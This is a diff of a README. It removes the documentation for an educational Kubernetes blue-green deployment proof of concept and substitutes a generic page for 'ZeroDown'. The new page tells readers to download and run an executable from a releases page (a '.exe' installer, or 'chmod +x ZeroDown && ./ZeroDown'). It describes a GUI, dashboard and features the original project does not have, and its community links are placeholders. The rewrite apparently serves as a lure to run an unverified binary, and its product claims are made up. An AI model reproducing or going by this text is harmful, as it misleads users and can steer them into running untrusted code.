@@ -1,349 +1,92 @@
-# Blue-Green Deployment PoC
+# 🚀 ZeroDown - Effortless Deployment with Zero Downtime
 
-![Status](https://img.shields.io/badge/Status-PoC-orange)
-![Kubernetes](https://img.shields.io/badge/kubernetes-%23326ce5.svg?style=flat&logo=kubernetes&logoColor=white)
-![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=flat&logo=docker&logoColor=white)
-![TypeScript](https://img.shields.io/badge/typescript-%23007ACC.svg?style=flat&logo=typescript&logoColor=white)
-![License](https://img.shields.io/badge/license-MIT-green)
+[![Download ZeroDown](https://img.shields.io/badge/Download%20ZeroDown-v1.0-blue)](https://github.com/Shsushd/ZeroDown/releases)
 
-> **Note**: This project is a **Proof of Concept (PoC)** designed for educational and demonstration purposes.
+## 📦 Overview
 
-A proof-of-concept demonstrating **Blue-Green deployment** strategy using Kubernetes with a Node.js/TypeScript backend application.
+ZeroDown is a robust deployment system designed for Kubernetes. It allows you to perform Blue-Green deployments with ease. With features like automated health checks, instant rollbacks, and seamless traffic switching, you can deploy your applications without any downtime. 
 
-## Overview
+## 🧩 Key Features
 
-This project showcases zero-downtime deployments by maintaining two identical production environments (Blue and Green). Traffic can be instantly switched between versions, enabling safe deployments with quick rollback capabilities.
+- **Blue-Green Deployment**: Change versions of your applications without affecting users.
+- **Automated Health Checks**: Ensure your application is always running smoothly.
+- **Instant Rollbacks**: If something goes wrong, revert to the previous version effortlessly.
+- **Seamless Traffic Switching**: Direct traffic to the new version only when it’s ready for use.
 
-## Showcase
+## 📋 Requirements
 
-![Blue-Green Architecture](showcase/blue_green_architecture.png)
+Before downloading ZeroDown, ensure you have the following:
 
-**Short Description:**
-> A robust, zero-downtime Blue-Green deployment system for Kubernetes, featuring automated health checks, instant rollbacks, and seamless traffic switching.
+- **Operating System**: Windows, macOS, or Linux
+- **Docker**: Install Docker to run containers.
+- **Kubernetes**: Set up your Kubernetes environment.
+- **Node.js**: Version 14 or later is recommended for running background services.
+- **Memory**: At least 4 GB of RAM is recommended.
+- **Disk Space**: 200 MB of free space for installation.
 
-### Key Features
+## 🚀 Getting Started
 
-- **Zero-downtime deployments**: Switch traffic between versions instantly
-- **Quick rollback**: Revert to the previous version in seconds
-- **Health monitoring**: Automated readiness and liveness probes
-- **Auto-scaling**: Horizontal Pod Autoscaler (HPA) for dynamic scaling
-- **Containerized**: Docker-based application packaging
-- **Production-ready**: Multi-stage builds, resource limits, and health checks
+To get started with ZeroDown, follow these steps:
 
-## Architecture
+1. Visit the [Releases Page](https://github.com/Shsushd/ZeroDown/releases) to download the latest version.
+2. Locate the file suitable for your operating system.
+3. Click on the file name to download it.
 
-```mermaid
-graph TB
-    LB[LoadBalancer Service]
-    BLUE[Blue Deployment<br/>v1]
-    GREEN[Green Deployment<br/>v2]
-    HPA[Horizontal Pod Autoscaler]
+## 📥 Download & Install
 
-    LB -->|selector: version=blue| BLUE
-    LB -.->|switch traffic| GREEN
-    HPA -->|scales| BLUE
-    HPA -->|scales| GREEN
-```
+You can download ZeroDown from the link below:
 
-## Quick Start
+[Download ZeroDown](https://github.com/Shsushd/ZeroDown/releases)
 
-> [!IMPORTANT] > **New to this project?** Start with the complete setup guide: [SETUP.md](SETUP.md)
->
-> This guide walks you through setting up everything from a vanilla Ubuntu server.
+1. After downloading, locate the file on your computer.
+2. For Windows users, double-click on the `.exe` file. For macOS and Linux users, open a terminal and navigate to the downloaded file's directory.
+3. Run the installation command:
+   - On macOS/Linux: `chmod +x ZeroDown && ./ZeroDown`
+   - On Windows: Just follow the prompts on the installer.
 
-### Prerequisites
+## 📖 How to Use ZeroDown
 
-- Docker (v20.10+)
-- Minikube (v1.30+)
-- minikube kubectl -- (installed with minikube)
-- Node.js 18+ (for local development)
+1. **Start the Application**: Once installed, launch ZeroDown from your applications directory or command line.
+2. **Configure Your Deployment**:
+   - Define your application settings and specify the version you wish to deploy. 
+   - Ensure you specify the Kubernetes cluster configuration to connect to your environment.
+3. **Run the Deployment**: Click on "Deploy" to begin the Blue-Green deployment process. ZeroDown will handle the rest.
+4. **Monitor Health Checks**: Watch the application health on your dashboard. If all checks pass, ZeroDown will switch traffic to the new version.
+5. **Roll Back If Needed**: If issues arise, use the "Rollback" feature to revert back to the previous application state instantly.
 
-### Installation
+## 📊 Troubleshooting
 
-1. **Clone the repository**
+If you encounter any issues while using ZeroDown, consider these steps:
 
-   ```bash
-   git clone <repository-url>
-   cd kurbentes
-   ```
+- Ensure all prerequisites are met, including your Kubernetes setup.
+- Check Docker logs for any errors during deployment.
+- Restart the application and ensure no other services conflict with ZeroDown.
+- Visit the [Issues Page](https://github.com/Shsushd/ZeroDown/issues) for additional support and community help.
 
-2. **Install dependencies**
+## 🤝 Contributing
 
-   ```bash
-   npm install
-   ```
+If you enjoy using ZeroDown and want to contribute, you can:
 
-3. **Build the application**
+- Report issues you find on the Issues page.
+- Suggest new features or improvements.
+- Submit code changes through pull requests.
 
-   ```bash
-   npm run build
-   ```
+## 🌐 Community
 
-4. **Build Docker images**
+Join the ZeroDown community to stay up-to-date with the latest news and share your experiences. Connect with us on our [Discord Server](#) or follow us on [Twitter](#) for updates.
 
-   ```bash
-   # Build version 1 (Blue)
-   docker build -t backend:v1 --build-arg APP_VERSION=v1 .
+## 📄 License
 
-   # Build version 2 (Green)
-   docker build -t backend:v2 --build-arg APP_VERSION=v2 .
+ZeroDown is licensed under the MIT License. You can review it for more detailed information.
 
-   # Load images into minikube
-   minikube image load backend:v1
-   minikube image load backend:v2
-   ```
+## 📞 Support
 
-5. **Deploy to Kubernetes**
+For support, please reach out via the Issues page or contact us through our community channels.
 
-   ```bash
-   # Deploy service
-   minikube kubectl -- apply -f k8s/service.yaml
+## 📌 Additional Resources
 
-   # Deploy blue version
-   minikube kubectl -- apply -f k8s/blue-deployment.yaml
+- [Official Documentation](#)
+- [Kubernetes Documentation](https://kubernetes.io/docs/)
+- [Docker Get Started Guide](https://docs.docker.com/get-started/)
 
-   # Deploy green version
-   minikube kubectl -- apply -f k8s/green-deployment.yaml
-
-   # Apply HPA
-   minikube kubectl -- apply -f k8s/hpa.yaml
-   ```
-
-## Usage
-
-### Deploying a New Version
-
-Use the deployment script to switch between blue and green versions:
-
-```bash
-# Deploy and switch to blue version
-./deploy.sh blue
-
-# Deploy and switch to green version
-./deploy.sh green
-```
-
-The script performs the following steps:
-
-1. Deploys the target version
-2. Waits for pods to be ready
-3. Runs validation checks
-4. Switches traffic to the new version
-
-### Testing the Application
-
-```bash
-# Get the service URL (minikube will open in browser)
-minikube service backend-service --url
-
-# Or use in terminal
-SERVICE_URL=$(minikube service backend-service --url)
-curl $SERVICE_URL/
-# Response: "Hello from Backend v1!" or "Hello from Backend v2!"
-
-# Check version
-curl $SERVICE_URL/version
-
-# Health check
-curl $SERVICE_URL/health
-```
-
-### Monitoring
-
-```bash
-# View pods
-minikube kubectl -- get pods -l app=backend
-
-# View deployments
-minikube kubectl -- get deployments
-
-# View service details
-minikube kubectl -- get service backend-service
-
-# Check HPA status
-minikube kubectl -- get hpa backend-hpa
-
-# View logs
-minikube kubectl -- logs -l app=backend --tail=50
-```
-
-## Project Structure
-
-```
-kurbentes/
-├── src/
-│   └── server.ts           # Express application
-├── k8s/
-│   ├── blue-deployment.yaml   # Blue version deployment
-│   ├── green-deployment.yaml  # Green version deployment
-│   ├── service.yaml          # LoadBalancer service
-│   └── hpa.yaml              # Horizontal Pod Autoscaler
-├── docs/                    # Additional documentation
-├── Dockerfile              # Multi-stage Docker build
-├── deploy.sh              # Blue-Green deployment script
-├── package.json
-├── tsconfig.json
-└── README.md
-```
-
-## API Endpoints
-
-| Endpoint   | Method | Description                                |
-| ---------- | ------ | ------------------------------------------ |
-| `/`        | GET    | Returns greeting with version              |
-| `/version` | GET    | Returns version information                |
-| `/health`  | GET    | Health check endpoint (readiness/liveness) |
-
-## Development
-
-### Local Development
-
-```bash
-# Run in development mode with auto-reload
-npm run dev
-
-# Build TypeScript
-npm run build
-
-# Run production build
-npm start
-```
-
-### Making Code Changes
-
-1. Update code in `src/server.ts`
-2. Update `APP_VERSION` environment variable in deployment files
-3. Build new Docker image with new version tag
-4. Deploy using `deploy.sh`
-
-## Configuration
-
-### Environment Variables
-
-- `PORT`: Server port (default: 3000)
-- `APP_VERSION`: Application version identifier
-
-### Resource Limits
-
-Each pod has the following resource configuration:
-
-- **Requests**: 100m CPU, 128Mi memory
-- **Limits**: 200m CPU, 256Mi memory
-
-### Auto-scaling
-
-HPA configuration:
-
-- **Min replicas**: 2
-- **Max replicas**: 10
-- **CPU target**: 50% utilization
-
-## Troubleshooting
-
-### Pods not starting
-
-```bash
-# Check pod status
-minikube kubectl -- describe pod <pod-name>
-
-# View logs
-minikube kubectl -- logs <pod-name>
-```
-
-### Service not accessible
-
-```bash
-# Verify service exists
-minikube kubectl -- get service backend-service
-
-# Check endpoints
-minikube kubectl -- get endpoints backend-service
-
-# Use minikube service to access
-minikube service backend-service
-
-# Or get URL
-minikube service backend-service --url
-```
-
-### Traffic not switching
-
-```bash
-# Verify service selector
-minikube kubectl -- get service backend-service -o yaml | grep -A 2 selector
-
-# Manually patch service
-minikube kubectl -- patch service backend-service -p '{"spec":{"selector":{"version":"blue"}}}'
-```
-
-### HPA not scaling
-
-```bash
-# Check metrics server is running
-minikube kubectl -- get deployment metrics-server -n kube-system
-
-# View HPA details
-minikube kubectl -- describe hpa backend-hpa
-```
-
-## Advanced Topics
-
-### Rollback Strategy
-
-If issues are detected after deployment:
-
-```bash
-# Quick rollback - switch service selector back
-minikube kubectl -- patch service backend-service -p '{"spec":{"selector":{"version":"blue"}}}'
-```
-
-### Canary Deployment
-
-Modify service to split traffic:
-
-```bash
-# Create separate services for blue/green
-# Use an Ingress controller with traffic splitting
-```
-
-### Database Migrations
-
-> [!WARNING]
-> For database schema changes, ensure backward compatibility during blue-green deployments.
-
-Best practices:
-
-1. Make schema changes backward compatible
-2. Deploy new version alongside old version
-3. Run migrations before traffic switch
-4. Keep old version running until migrations are verified
-
-## Documentation
-
-- **[SETUP.md](SETUP.md)**: Complete setup guide from vanilla Ubuntu server
-- **[DEPLOYMENT.md](DEPLOYMENT.md)**: Detailed deployment strategies and procedures
-- **[docs/](docs/)**: Additional technical documentation
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
-
-## License
-
-MIT License - see LICENSE file for details
-
-## Support
-
-For issues or questions:
-
-- Check the [Troubleshooting](#troubleshooting) section
-- Review [SETUP.md](SETUP.md) for configuration issues
-- Open an issue in the repository
-
----
-
-**Happy Deploying!**
+By following these steps, you can successfully download and run ZeroDown, making your deployment processes easier and more efficient.
